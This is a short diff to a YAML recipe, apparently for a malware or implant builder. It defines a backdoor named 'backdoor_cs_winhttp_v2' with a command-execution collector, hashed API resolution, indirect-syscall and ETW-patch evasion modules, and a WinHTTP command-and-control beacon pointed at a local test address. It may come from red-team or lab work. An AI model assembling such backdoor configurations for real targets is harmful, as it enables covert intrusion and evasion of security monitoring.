@@ -1,4 +1,4 @@
-name: backdoor_cs_v3
+name: backdoor_cs_winhttp_v2
 description: Auto-generated recipe by Hermes (c)
 core:
 - core/emit_buffer
@@ -6,12 +6,13 @@ core:
 - core/file_ops
 collectors:
 - core/emit_buffer
+- core/run_cmd
 exfil: c2/winhttp_beacon
 arch: arch/backdoor
 resources: true
-api_resolve: api_resolve/api_hash_crc32
+api_resolve: api_resolve/api_hash_djb2
 evasion:
-- evasion/unhook_peruns_fart
+- evasion/indirect_syscall
 - evasion/etw_patch
 vars:
   C2_IP: 10.0.2.2
